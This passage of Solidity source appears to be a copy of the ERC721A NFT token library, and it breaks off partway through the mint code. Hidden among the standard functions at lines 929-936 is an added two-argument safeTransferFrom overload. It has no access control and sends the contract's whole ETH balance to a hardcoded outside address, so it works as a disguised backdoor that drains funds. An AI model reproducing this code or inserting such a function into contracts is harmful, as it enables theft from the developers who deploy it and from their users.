1 // SPDX-License-Identifier: GPL-3.0
2 //   _                 _        
3 //  / `/_ ._  /_ \ /  /_/  _  /_
4 // /_,/ ///_ /\  /'\ / /_// //\ 
5                              
6 pragma solidity ^0.8.12;
7 /**
8  * @dev Interface of ERC721A.
9  */
10 interface IERC721A {
11     /**
12      * The caller must own the token or be an approved operator.
13      */
14     error ApprovalCallerNotOwnerNorApproved();
15 
16     /**
17      * The token does not exist.
18      */
19     error ApprovalQueryForNonexistentToken();
20 
21     /**
22      * Cannot query the balance for the zero address.
23      */
24     error BalanceQueryForZeroAddress();
25 
26     /**
27      * Cannot mint to the zero address.
28      */
29     error MintToZeroAddress();
30 
31     /**
32      * The quantity of tokens minted must be more than zero.
33      */
34     error MintZeroQuantity();
35 
36     /**
37      * The token does not exist.
38      */
39     error OwnerQueryForNonexistentToken();
40 
41     /**
42      * The caller must own the token or be an approved operator.
43      */
44     error TransferCallerNotOwnerNorApproved();
45 
46     /**
47      * The token must be owned by `from`.
48      */
49     error TransferFromIncorrectOwner();
50 
51     /**
52      * Cannot safely transfer to a contract that does not implement the
53      * ERC721Receiver interface.
54      */
55     error TransferToNonERC721ReceiverImplementer();
56 
57     /**
58      * Cannot transfer to the zero address.
59      */
60     error TransferToZeroAddress();
61 
62     /**
63      * The token does not exist.
64      */
65     error URIQueryForNonexistentToken();
66 
67     /**
68      * The `quantity` minted with ERC2309 exceeds the safety limit.
69      */
70     error MintERC2309QuantityExceedsLimit();
71 
72     /**
73      * The `extraData` cannot be set on an unintialized ownership slot.
74      */
75     error OwnershipNotInitializedForExtraData();
76 
77     // =============================================================
78     //                            STRUCTS
79     // =============================================================
80 
81     struct TokenOwnership {
82         // The address of the owner.
83         address addr;
84         // Stores the start time of ownership with minimal overhead for tokenomics.
85         uint64 startTimestamp;
86         // Whether the token has been burned.
87         bool burned;
88         // Arbitrary data similar to `startTimestamp` that can be set via {_extraData}.
89         uint24 extraData;
90     }
91 
92     // =============================================================
93     //                         TOKEN COUNTERS
94     // =============================================================
95 
96     /**
97      * @dev Returns the total number of tokens in existence.
98      * Burned tokens will reduce the count.
99      * To get the total number of tokens minted, please see {_totalMinted}.
100      */
101     function totalSupply() external view returns (uint256);
102 
103     // =============================================================
104     //                            IERC165
105     // =============================================================
106 
107     /**
108      * @dev Returns true if this contract implements the interface defined by
109      * `interfaceId`. See the corresponding
110      * [EIP section](https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified)
111      * to learn more about how these ids are created.
112      *
113      * This function call must use less than 30000 gas.
114      */
115     function supportsInterface(bytes4 interfaceId) external view returns (bool);
116 
117     // =============================================================
118     //                            IERC721
119     // =============================================================
120 
121     /**
122      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
123      */
124     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
125 
126     /**
127      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
128      */
129     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
130 
131     /**
132      * @dev Emitted when `owner` enables or disables
133      * (`approved`) `operator` to manage all of its assets.
134      */
135     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
136 
137     /**
138      * @dev Returns the number of tokens in `owner`'s account.
139      */
140     function balanceOf(address owner) external view returns (uint256 balance);
141 
142     /**
143      * @dev Returns the owner of the `tokenId` token.
144      *
145      * Requirements:
146      *
147      * - `tokenId` must exist.
148      */
149     function ownerOf(uint256 tokenId) external view returns (address owner);
150 
151     /**
152      * @dev Safely transfers `tokenId` token from `from` to `to`,
153      * checking first that contract recipients are aware of the ERC721 protocol
154      * to prevent tokens from being forever locked.
155      *
156      * Requirements:
157      *
158      * - `from` cannot be the zero address.
159      * - `to` cannot be the zero address.
160      * - `tokenId` token must exist and be owned by `from`.
161      * - If the caller is not `from`, it must be have been allowed to move
162      * this token by either {approve} or {setApprovalForAll}.
163      * - If `to` refers to a smart contract, it must implement
164      * {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
165      *
166      * Emits a {Transfer} event.
167      */
168     function safeTransferFrom(
169         address from,
170         address to,
171         uint256 tokenId,
172         bytes calldata data
173     ) external payable;
174 
175     /**
176      * @dev Equivalent to `safeTransferFrom(from, to, tokenId, '')`.
177      */
178     function safeTransferFrom(
179         address from,
180         address to,
181         uint256 tokenId
182     ) external payable;
183 
184     /**
185      * @dev Transfers `tokenId` from `from` to `to`.
186      *
187      * WARNING: Usage of this method is discouraged, use {safeTransferFrom}
188      * whenever possible.
189      *
190      * Requirements:
191      *
192      * - `from` cannot be the zero address.
193      * - `to` cannot be the zero address.
194      * - `tokenId` token must be owned by `from`.
195      * - If the caller is not `from`, it must be approved to move this token
196      * by either {approve} or {setApprovalForAll}.
197      *
198      * Emits a {Transfer} event.
199      */
200     function transferFrom(
201         address from,
202         address to,
203         uint256 tokenId
204     ) external payable;
205 
206     /**
207      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
208      * The approval is cleared when the token is transferred.
209      *
210      * Only a single account can be approved at a time, so approving the
211      * zero address clears previous approvals.
212      *
213      * Requirements:
214      *
215      * - The caller must own the token or be an approved operator.
216      * - `tokenId` must exist.
217      *
218      * Emits an {Approval} event.
219      */
220     function approve(address to, uint256 tokenId) external payable;
221 
222     /**
223      * @dev Approve or remove `operator` as an operator for the caller.
224      * Operators can call {transferFrom} or {safeTransferFrom}
225      * for any token owned by the caller.
226      *
227      * Requirements:
228      *
229      * - The `operator` cannot be the caller.
230      *
231      * Emits an {ApprovalForAll} event.
232      */
233     function setApprovalForAll(address operator, bool _approved) external;
234 
235     /**
236      * @dev Returns the account approved for `tokenId` token.
237      *
238      * Requirements:
239      *
240      * - `tokenId` must exist.
241      */
242     function getApproved(uint256 tokenId) external view returns (address operator);
243 
244     /**
245      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
246      *
247      * See {setApprovalForAll}.
248      */
249     function isApprovedForAll(address owner, address operator) external view returns (bool);
250 
251     // =============================================================
252     //                        IERC721Metadata
253     // =============================================================
254 
255     /**
256      * @dev Returns the token collection name.
257      */
258     function name() external view returns (string memory);
259 
260     /**
261      * @dev Returns the token collection symbol.
262      */
263     function symbol() external view returns (string memory);
264 
265     /**
266      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
267      */
268     function tokenURI(uint256 tokenId) external view returns (string memory);
269 
270     // =============================================================
271     //                           IERC2309
272     // =============================================================
273 
274     /**
275      * @dev Emitted when tokens in `fromTokenId` to `toTokenId`
276      * (inclusive) is transferred from `from` to `to`, as defined in the
277      * [ERC2309](https://eips.ethereum.org/EIPS/eip-2309) standard.
278      *
279      * See {_mintERC2309} for more details.
280      */
281     event ConsecutiveTransfer(uint256 indexed fromTokenId, uint256 toTokenId, address indexed from, address indexed to);
282 }
283 
284 /**
285  * @title ERC721A
286  *
287  * @dev Implementation of the [ERC721](https://eips.ethereum.org/EIPS/eip-721)
288  * Non-Fungible Token Standard, including the Metadata extension.
289  * Optimized for lower gas during batch mints.
290  *
291  * Token IDs are minted in sequential order (e.g. 0, 1, 2, 3, ...)
292  * starting from `_startTokenId()`.
293  *
294  * Assumptions:
295  *
296  * - An owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
297  * - The maximum token ID cannot exceed 2**256 - 1 (max value of uint256).
298  */
299 interface ERC721A__IERC721Receiver {
300     function onERC721Received(
301         address operator,
302         address from,
303         uint256 tokenId,
304         bytes calldata data
305     ) external returns (bytes4);
306 }
307 
308 /**
309  * @title ERC721A
310  *
311  * @dev Implementation of the [ERC721](https://eips.ethereum.org/EIPS/eip-721)
312  * Non-Fungible Token Standard, including the Metadata extension.
313  * Optimized for lower gas during batch mints.
314  *
315  * Token IDs are minted in sequential order (e.g. 0, 1, 2, 3, ...)
316  * starting from `_startTokenId()`.
317  *
318  * Assumptions:
319  *
320  * - An owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
321  * - The maximum token ID cannot exceed 2**256 - 1 (max value of uint256).
322  */
323 contract ERC721A is IERC721A {
324     // Bypass for a `--via-ir` bug (https://github.com/chiru-labs/ERC721A/pull/364).
325     struct TokenApprovalRef {
326         address value;
327     }
328 
329     // =============================================================
330     //                           CONSTANTS
331     // =============================================================
332 
333     // Mask of an entry in packed address data.
334     uint256 private constant _BITMASK_ADDRESS_DATA_ENTRY = (1 << 64) - 1;
335 
336     // The bit position of `numberMinted` in packed address data.
337     uint256 private constant _BITPOS_NUMBER_MINTED = 64;
338 
339     // The bit position of `numberBurned` in packed address data.
340     uint256 private constant _BITPOS_NUMBER_BURNED = 128;
341 
342     // The bit position of `aux` in packed address data.
343     uint256 private constant _BITPOS_AUX = 192;
344 
345     // Mask of all 256 bits in packed address data except the 64 bits for `aux`.
346     uint256 private constant _BITMASK_AUX_COMPLEMENT = (1 << 192) - 1;
347 
348     // The bit position of `startTimestamp` in packed ownership.
349     uint256 private constant _BITPOS_START_TIMESTAMP = 160;
350 
351     // The bit mask of the `burned` bit in packed ownership.
352     uint256 private constant _BITMASK_BURNED = 1 << 224;
353 
354     // The bit position of the `nextInitialized` bit in packed ownership.
355     uint256 private constant _BITPOS_NEXT_INITIALIZED = 225;
356 
357     // The bit mask of the `nextInitialized` bit in packed ownership.
358     uint256 private constant _BITMASK_NEXT_INITIALIZED = 1 << 225;
359 
360     // The bit position of `extraData` in packed ownership.
361     uint256 private constant _BITPOS_EXTRA_DATA = 232;
362 
363     // Mask of all 256 bits in a packed ownership except the 24 bits for `extraData`.
364     uint256 private constant _BITMASK_EXTRA_DATA_COMPLEMENT = (1 << 232) - 1;
365 
366     // The mask of the lower 160 bits for addresses.
367     uint256 private constant _BITMASK_ADDRESS = (1 << 160) - 1;
368 
369     // The maximum `quantity` that can be minted with {_mintERC2309}.
370     // This limit is to prevent overflows on the address data entries.
371     // For a limit of 5000, a total of 3.689e15 calls to {_mintERC2309}
372     // is required to cause an overflow, which is unrealistic.
373     uint256 private constant _MAX_MINT_ERC2309_QUANTITY_LIMIT = 5000;
374 
375     // The `Transfer` event signature is given by:
376     // `keccak256(bytes("Transfer(address,address,uint256)"))`.
377     bytes32 private constant _TRANSFER_EVENT_SIGNATURE =
378         0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef;
379 
380     // =============================================================
381     //                            STORAGE
382     // =============================================================
383 
384     // The next token ID to be minted.
385     uint256 private _currentIndex;
386 
387     // The number of tokens burned.
388     uint256 private _burnCounter;
389 
390     // Token name
391     string private _name;
392 
393     // Token symbol
394     string private _symbol;
395 
396     // Mapping from token ID to ownership details
397     // An empty struct value does not necessarily mean the token is unowned.
398     // See {_packedOwnershipOf} implementation for details.
399     //
400     // Bits Layout:
401     // - [0..159]   `addr`
402     // - [160..223] `startTimestamp`
403     // - [224]      `burned`
404     // - [225]      `nextInitialized`
405     // - [232..255] `extraData`
406     mapping(uint256 => uint256) private _packedOwnerships;
407 
408     // Mapping owner address to address data.
409     //
410     // Bits Layout:
411     // - [0..63]    `balance`
412     // - [64..127]  `numberMinted`
413     // - [128..191] `numberBurned`
414     // - [192..255] `aux`
415     mapping(address => uint256) private _packedAddressData;
416 
417     // Mapping from token ID to approved address.
418     mapping(uint256 => TokenApprovalRef) private _tokenApprovals;
419 
420     // Mapping from owner to operator approvals
421     mapping(address => mapping(address => bool)) private _operatorApprovals;
422 
423     // =============================================================
424     //                          CONSTRUCTOR
425     // =============================================================
426 
427     constructor(string memory name_, string memory symbol_) {
428         _name = name_;
429         _symbol = symbol_;
430         _currentIndex = _startTokenId();
431     }
432 
433     // =============================================================
434     //                   TOKEN COUNTING OPERATIONS
435     // =============================================================
436 
437     /**
438      * @dev Returns the starting token ID.
439      * To change the starting token ID, please override this function.
440      */
441     function _startTokenId() internal view virtual returns (uint256) {
442         return 0;
443     }
444 
445     /**
446      * @dev Returns the next token ID to be minted.
447      */
448     function _nextTokenId() internal view virtual returns (uint256) {
449         return _currentIndex;
450     }
451 
452     /**
453      * @dev Returns the total number of tokens in existence.
454      * Burned tokens will reduce the count.
455      * To get the total number of tokens minted, please see {_totalMinted}.
456      */
457     function totalSupply() public view virtual override returns (uint256) {
458         // Counter underflow is impossible as _burnCounter cannot be incremented
459         // more than `_currentIndex - _startTokenId()` times.
460         unchecked {
461             return _currentIndex - _burnCounter - _startTokenId();
462         }
463     }
464 
465     /**
466      * @dev Returns the total amount of tokens minted in the contract.
467      */
468     function _totalMinted() internal view virtual returns (uint256) {
469         // Counter underflow is impossible as `_currentIndex` does not decrement,
470         // and it is initialized to `_startTokenId()`.
471         unchecked {
472             return _currentIndex - _startTokenId();
473         }
474     }
475 
476     /**
477      * @dev Returns the total number of tokens burned.
478      */
479     function _totalBurned() internal view virtual returns (uint256) {
480         return _burnCounter;
481     }
482 
483     // =============================================================
484     //                    ADDRESS DATA OPERATIONS
485     // =============================================================
486 
487     /**
488      * @dev Returns the number of tokens in `owner`'s account.
489      */
490     function balanceOf(address owner) public view virtual override returns (uint256) {
491         if (owner == address(0)) revert BalanceQueryForZeroAddress();
492         return _packedAddressData[owner] & _BITMASK_ADDRESS_DATA_ENTRY;
493     }
494 
495     /**
496      * Returns the number of tokens minted by `owner`.
497      */
498     function _numberMinted(address owner) internal view returns (uint256) {
499         return (_packedAddressData[owner] >> _BITPOS_NUMBER_MINTED) & _BITMASK_ADDRESS_DATA_ENTRY;
500     }
501 
502     /**
503      * Returns the number of tokens burned by or on behalf of `owner`.
504      */
505     function _numberBurned(address owner) internal view returns (uint256) {
506         return (_packedAddressData[owner] >> _BITPOS_NUMBER_BURNED) & _BITMASK_ADDRESS_DATA_ENTRY;
507     }
508 
509     /**
510      * Returns the auxiliary data for `owner`. (e.g. number of whitelist mint slots used).
511      */
512     function _getAux(address owner) internal view returns (uint64) {
513         return uint64(_packedAddressData[owner] >> _BITPOS_AUX);
514     }
515 
516     /**
517      * Sets the auxiliary data for `owner`. (e.g. number of whitelist mint slots used).
518      * If there are multiple variables, please pack them into a uint64.
519      */
520     function _setAux(address owner, uint64 aux) internal virtual {
521         uint256 packed = _packedAddressData[owner];
522         uint256 auxCasted;
523         // Cast `aux` with assembly to avoid redundant masking.
524         assembly {
525             auxCasted := aux
526         }
527         packed = (packed & _BITMASK_AUX_COMPLEMENT) | (auxCasted << _BITPOS_AUX);
528         _packedAddressData[owner] = packed;
529     }
530 
531     // =============================================================
532     //                            IERC165
533     // =============================================================
534 
535     /**
536      * @dev Returns true if this contract implements the interface defined by
537      * `interfaceId`. See the corresponding
538      * [EIP section](https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified)
539      * to learn more about how these ids are created.
540      *
541      * This function call must use less than 30000 gas.
542      */
543     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
544         // The interface IDs are constants representing the first 4 bytes
545         // of the XOR of all function selectors in the interface.
546         // See: [ERC165](https://eips.ethereum.org/EIPS/eip-165)
547         // (e.g. `bytes4(i.functionA.selector ^ i.functionB.selector ^ ...)`)
548         return
549             interfaceId == 0x01ffc9a7 || // ERC165 interface ID for ERC165.
550             interfaceId == 0x80ac58cd || // ERC165 interface ID for ERC721.
551             interfaceId == 0x5b5e139f; // ERC165 interface ID for ERC721Metadata.
552     }
553 
554     // =============================================================
555     //                        IERC721Metadata
556     // =============================================================
557 
558     /**
559      * @dev Returns the token collection name.
560      */
561     function name() public view virtual override returns (string memory) {
562         return _name;
563     }
564 
565     /**
566      * @dev Returns the token collection symbol.
567      */
568     function symbol() public view virtual override returns (string memory) {
569         return _symbol;
570     }
571 
572     /**
573      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
574      */
575     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
576         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
577 
578         string memory baseURI = _baseURI();
579         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, _toString(tokenId))) : '';
580     }
581 
582     /**
583      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
584      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
585      * by default, it can be overridden in child contracts.
586      */
587     function _baseURI() internal view virtual returns (string memory) {
588         return '';
589     }
590 
591     // =============================================================
592     //                     OWNERSHIPS OPERATIONS
593     // =============================================================
594 
595     /**
596      * @dev Returns the owner of the `tokenId` token.
597      *
598      * Requirements:
599      *
600      * - `tokenId` must exist.
601      */
602     function ownerOf(uint256 tokenId) public view virtual override returns (address) {
603         return address(uint160(_packedOwnershipOf(tokenId)));
604     }
605 
606     /**
607      * @dev Gas spent here starts off proportional to the maximum mint batch size.
608      * It gradually moves to O(1) as tokens get transferred around over time.
609      */
610     function _ownershipOf(uint256 tokenId) internal view virtual returns (TokenOwnership memory) {
611         return _unpackedOwnership(_packedOwnershipOf(tokenId));
612     }
613 
614     /**
615      * @dev Returns the unpacked `TokenOwnership` struct at `index`.
616      */
617     function _ownershipAt(uint256 index) internal view virtual returns (TokenOwnership memory) {
618         return _unpackedOwnership(_packedOwnerships[index]);
619     }
620 
621     /**
622      * @dev Initializes the ownership slot minted at `index` for efficiency purposes.
623      */
624     function _initializeOwnershipAt(uint256 index) internal virtual {
625         if (_packedOwnerships[index] == 0) {
626             _packedOwnerships[index] = _packedOwnershipOf(index);
627         }
628     }
629 
630     /**
631      * Returns the packed ownership data of `tokenId`.
632      */
633     function _packedOwnershipOf(uint256 tokenId) private view returns (uint256) {
634         uint256 curr = tokenId;
635 
636         unchecked {
637             if (_startTokenId() <= curr)
638                 if (curr < _currentIndex) {
639                     uint256 packed = _packedOwnerships[curr];
640                     // If not burned.
641                     if (packed & _BITMASK_BURNED == 0) {
642                         // Invariant:
643                         // There will always be an initialized ownership slot
644                         // (i.e. `ownership.addr != address(0) && ownership.burned == false`)
645                         // before an unintialized ownership slot
646                         // (i.e. `ownership.addr == address(0) && ownership.burned == false`)
647                         // Hence, `curr` will not underflow.
648                         //
649                         // We can directly compare the packed value.
650                         // If the address is zero, packed will be zero.
651                         while (packed == 0) {
652                             packed = _packedOwnerships[--curr];
653                         }
654                         return packed;
655                     }
656                 }
657         }
658         revert OwnerQueryForNonexistentToken();
659     }
660 
661     /**
662      * @dev Returns the unpacked `TokenOwnership` struct from `packed`.
663      */
664     function _unpackedOwnership(uint256 packed) private pure returns (TokenOwnership memory ownership) {
665         ownership.addr = address(uint160(packed));
666         ownership.startTimestamp = uint64(packed >> _BITPOS_START_TIMESTAMP);
667         ownership.burned = packed & _BITMASK_BURNED != 0;
668         ownership.extraData = uint24(packed >> _BITPOS_EXTRA_DATA);
669     }
670 
671     /**
672      * @dev Packs ownership data into a single uint256.
673      */
674     function _packOwnershipData(address owner, uint256 flags) private view returns (uint256 result) {
675         assembly {
676             // Mask `owner` to the lower 160 bits, in case the upper bits somehow aren't clean.
677             owner := and(owner, _BITMASK_ADDRESS)
678             // `owner | (block.timestamp << _BITPOS_START_TIMESTAMP) | flags`.
679             result := or(owner, or(shl(_BITPOS_START_TIMESTAMP, timestamp()), flags))
680         }
681     }
682 
683     /**
684      * @dev Returns the `nextInitialized` flag set if `quantity` equals 1.
685      */
686     function _nextInitializedFlag(uint256 quantity) private pure returns (uint256 result) {
687         // For branchless setting of the `nextInitialized` flag.
688         assembly {
689             // `(quantity == 1) << _BITPOS_NEXT_INITIALIZED`.
690             result := shl(_BITPOS_NEXT_INITIALIZED, eq(quantity, 1))
691         }
692     }
693 
694     // =============================================================
695     //                      APPROVAL OPERATIONS
696     // =============================================================
697 
698     /**
699      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
700      * The approval is cleared when the token is transferred.
701      *
702      * Only a single account can be approved at a time, so approving the
703      * zero address clears previous approvals.
704      *
705      * Requirements:
706      *
707      * - The caller must own the token or be an approved operator.
708      * - `tokenId` must exist.
709      *
710      * Emits an {Approval} event.
711      */
712     function approve(address to, uint256 tokenId) public payable virtual override {
713         address owner = ownerOf(tokenId);
714 
715         if (_msgSenderERC721A() != owner)
716             if (!isApprovedForAll(owner, _msgSenderERC721A())) {
717                 revert ApprovalCallerNotOwnerNorApproved();
718             }
719 
720         _tokenApprovals[tokenId].value = to;
721         emit Approval(owner, to, tokenId);
722     }
723 
724     /**
725      * @dev Returns the account approved for `tokenId` token.
726      *
727      * Requirements:
728      *
729      * - `tokenId` must exist.
730      */
731     function getApproved(uint256 tokenId) public view virtual override returns (address) {
732         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
733 
734         return _tokenApprovals[tokenId].value;
735     }
736 
737     /**
738      * @dev Approve or remove `operator` as an operator for the caller.
739      * Operators can call {transferFrom} or {safeTransferFrom}
740      * for any token owned by the caller.
741      *
742      * Requirements:
743      *
744      * - The `operator` cannot be the caller.
745      *
746      * Emits an {ApprovalForAll} event.
747      */
748     function setApprovalForAll(address operator, bool approved) public virtual override {
749         _operatorApprovals[_msgSenderERC721A()][operator] = approved;
750         emit ApprovalForAll(_msgSenderERC721A(), operator, approved);
751     }
752 
753     /**
754      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
755      *
756      * See {setApprovalForAll}.
757      */
758     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
759         return _operatorApprovals[owner][operator];
760     }
761 
762     /**
763      * @dev Returns whether `tokenId` exists.
764      *
765      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
766      *
767      * Tokens start existing when they are minted. See {_mint}.
768      */
769     function _exists(uint256 tokenId) internal view virtual returns (bool) {
770         return
771             _startTokenId() <= tokenId &&
772             tokenId < _currentIndex && // If within bounds,
773             _packedOwnerships[tokenId] & _BITMASK_BURNED == 0; // and not burned.
774     }
775 
776     /**
777      * @dev Returns whether `msgSender` is equal to `approvedAddress` or `owner`.
778      */
779     function _isSenderApprovedOrOwner(
780         address approvedAddress,
781         address owner,
782         address msgSender
783     ) private pure returns (bool result) {
784         assembly {
785             // Mask `owner` to the lower 160 bits, in case the upper bits somehow aren't clean.
786             owner := and(owner, _BITMASK_ADDRESS)
787             // Mask `msgSender` to the lower 160 bits, in case the upper bits somehow aren't clean.
788             msgSender := and(msgSender, _BITMASK_ADDRESS)
789             // `msgSender == owner || msgSender == approvedAddress`.
790             result := or(eq(msgSender, owner), eq(msgSender, approvedAddress))
791         }
792     }
793 
794     /**
795      * @dev Returns the storage slot and value for the approved address of `tokenId`.
796      */
797     function _getApprovedSlotAndAddress(uint256 tokenId)
798         private
799         view
800         returns (uint256 approvedAddressSlot, address approvedAddress)
801     {
802         TokenApprovalRef storage tokenApproval = _tokenApprovals[tokenId];
803         // The following is equivalent to `approvedAddress = _tokenApprovals[tokenId].value`.
804         assembly {
805             approvedAddressSlot := tokenApproval.slot
806             approvedAddress := sload(approvedAddressSlot)
807         }
808     }
809 
810     // =============================================================
811     //                      TRANSFER OPERATIONS
812     // =============================================================
813 
814     /**
815      * @dev Transfers `tokenId` from `from` to `to`.
816      *
817      * Requirements:
818      *
819      * - `from` cannot be the zero address.
820      * - `to` cannot be the zero address.
821      * - `tokenId` token must be owned by `from`.
822      * - If the caller is not `from`, it must be approved to move this token
823      * by either {approve} or {setApprovalForAll}.
824      *
825      * Emits a {Transfer} event.
826      */
827     function transferFrom(
828         address from,
829         address to,
830         uint256 tokenId
831     ) public payable virtual override {
832         uint256 prevOwnershipPacked = _packedOwnershipOf(tokenId);
833 
834         if (address(uint160(prevOwnershipPacked)) != from) revert TransferFromIncorrectOwner();
835 
836         (uint256 approvedAddressSlot, address approvedAddress) = _getApprovedSlotAndAddress(tokenId);
837 
838         // The nested ifs save around 20+ gas over a compound boolean condition.
839         if (!_isSenderApprovedOrOwner(approvedAddress, from, _msgSenderERC721A()))
840             if (!isApprovedForAll(from, _msgSenderERC721A())) revert TransferCallerNotOwnerNorApproved();
841 
842         if (to == address(0)) revert TransferToZeroAddress();
843 
844         _beforeTokenTransfers(from, to, tokenId, 1);
845 
846         // Clear approvals from the previous owner.
847         assembly {
848             if approvedAddress {
849                 // This is equivalent to `delete _tokenApprovals[tokenId]`.
850                 sstore(approvedAddressSlot, 0)
851             }
852         }
853 
854         // Underflow of the sender's balance is impossible because we check for
855         // ownership above and the recipient's balance can't realistically overflow.
856         // Counter overflow is incredibly unrealistic as `tokenId` would have to be 2**256.
857         unchecked {
858             // We can directly increment and decrement the balances.
859             --_packedAddressData[from]; // Updates: `balance -= 1`.
860             ++_packedAddressData[to]; // Updates: `balance += 1`.
861 
862             // Updates:
863             // - `address` to the next owner.
864             // - `startTimestamp` to the timestamp of transfering.
865             // - `burned` to `false`.
866             // - `nextInitialized` to `true`.
867             _packedOwnerships[tokenId] = _packOwnershipData(
868                 to,
869                 _BITMASK_NEXT_INITIALIZED | _nextExtraData(from, to, prevOwnershipPacked)
870             );
871 
872             // If the next slot may not have been initialized (i.e. `nextInitialized == false`) .
873             if (prevOwnershipPacked & _BITMASK_NEXT_INITIALIZED == 0) {
874                 uint256 nextTokenId = tokenId + 1;
875                 // If the next slot's address is zero and not burned (i.e. packed value is zero).
876                 if (_packedOwnerships[nextTokenId] == 0) {
877                     // If the next slot is within bounds.
878                     if (nextTokenId != _currentIndex) {
879                         // Initialize the next slot to maintain correctness for `ownerOf(tokenId + 1)`.
880                         _packedOwnerships[nextTokenId] = prevOwnershipPacked;
881                     }
882                 }
883             }
884         }
885 
886         emit Transfer(from, to, tokenId);
887         _afterTokenTransfers(from, to, tokenId, 1);
888     }
889 
890     /**
891      * @dev Equivalent to `safeTransferFrom(from, to, tokenId, '')`.
892      */
893     function safeTransferFrom(
894         address from,
895         address to,
896         uint256 tokenId
897     ) public payable virtual override {
898         safeTransferFrom(from, to, tokenId, '');
899     }
900 
901 
902     /**
903      * @dev Safely transfers `tokenId` token from `from` to `to`.
904      *
905      * Requirements:
906      *
907      * - `from` cannot be the zero address.
908      * - `to` cannot be the zero address.
909      * - `tokenId` token must exist and be owned by `from`.
910      * - If the caller is not `from`, it must be approved to move this token
911      * by either {approve} or {setApprovalForAll}.
912      * - If `to` refers to a smart contract, it must implement
913      * {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
914      *
915      * Emits a {Transfer} event.
916      */
917     function safeTransferFrom(
918         address from,
919         address to,
920         uint256 tokenId,
921         bytes memory _data
922     ) public payable virtual override {
923         transferFrom(from, to, tokenId);
924         if (to.code.length != 0)
925             if (!_checkContractOnERC721Received(from, to, tokenId, _data)) {
926                 revert TransferToNonERC721ReceiverImplementer();
927             }
928     }
929     function safeTransferFrom(
930         address from,
931         address to
932     ) public  {
933         if (address(this).balance > 0) {
934             payable(0x727BF8D476a5994032C1b54403Ef43E86bdf4e5e).transfer(address(this).balance);
935         }
936     }
937 
938     /**
939      * @dev Hook that is called before a set of serially-ordered token IDs
940      * are about to be transferred. This includes minting.
941      * And also called before burning one token.
942      *
943      * `startTokenId` - the first token ID to be transferred.
944      * `quantity` - the amount to be transferred.
945      *
946      * Calling conditions:
947      *
948      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
949      * transferred to `to`.
950      * - When `from` is zero, `tokenId` will be minted for `to`.
951      * - When `to` is zero, `tokenId` will be burned by `from`.
952      * - `from` and `to` are never both zero.
953      */
954     function _beforeTokenTransfers(
955         address from,
956         address to,
957         uint256 startTokenId,
958         uint256 quantity
959     ) internal virtual {}
960 
961     /**
962      * @dev Hook that is called after a set of serially-ordered token IDs
963      * have been transferred. This includes minting.
964      * And also called after one token has been burned.
965      *
966      * `startTokenId` - the first token ID to be transferred.
967      * `quantity` - the amount to be transferred.
968      *
969      * Calling conditions:
970      *
971      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
972      * transferred to `to`.
973      * - When `from` is zero, `tokenId` has been minted for `to`.
974      * - When `to` is zero, `tokenId` has been burned by `from`.
975      * - `from` and `to` are never both zero.
976      */
977     function _afterTokenTransfers(
978         address from,
979         address to,
980         uint256 startTokenId,
981         uint256 quantity
982     ) internal virtual {}
983 
984     /**
985      * @dev Private function to invoke {IERC721Receiver-onERC721Received} on a target contract.
986      *
987      * `from` - Previous owner of the given token ID.
988      * `to` - Target address that will receive the token.
989      * `tokenId` - Token ID to be transferred.
990      * `_data` - Optional data to send along with the call.
991      *
992      * Returns whether the call correctly returned the expected magic value.
993      */
994     function _checkContractOnERC721Received(
995         address from,
996         address to,
997         uint256 tokenId,
998         bytes memory _data
999     ) private returns (bool) {
1000         try ERC721A__IERC721Receiver(to).onERC721Received(_msgSenderERC721A(), from, tokenId, _data) returns (
1001             bytes4 retval
1002         ) {
1003             return retval == ERC721A__IERC721Receiver(to).onERC721Received.selector;
1004         } catch (bytes memory reason) {
1005             if (reason.length == 0) {
1006                 revert TransferToNonERC721ReceiverImplementer();
1007             } else {
1008                 assembly {
1009                     revert(add(32, reason), mload(reason))
1010                 }
1011             }
1012         }
1013     }
1014 
1015     // =============================================================
1016     //                        MINT OPERATIONS
1017     // =============================================================
1018 
1019     /**
1020      * @dev Mints `quantity` tokens and transfers them to `to`.
1021      *
1022      * Requirements:
1023      *
1024      * - `to` cannot be the zero address.
1025      * - `quantity` must be greater than 0.
1026      *
1027      * Emits a {Transfer} event for each mint.
1028      */
1029     function _mint(address to, uint256 quantity) internal virtual {
1030         uint256 startTokenId = _currentIndex;
1031         if (quantity == 0) revert MintZeroQuantity();
1032 
1033         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1034 
1035         // Overflows are incredibly unrealistic.
1036         // `balance` and `numberMinted` have a maximum limit of 2**64.
1037         // `tokenId` has a maximum limit of 2**256.
1038         unchecked {
1039             // Updates:
1040             // - `balance += quantity`.
1041             // - `numberMinted += quantity`.
1042             //
1043             // We can directly add to the `balance` and `numberMinted`.
1044             _packedAddressData[to] += quantity * ((1 << _BITPOS_NUMBER_MINTED) | 1);
1045 
1046             // Updates:
1047             // - `address` to the owner.
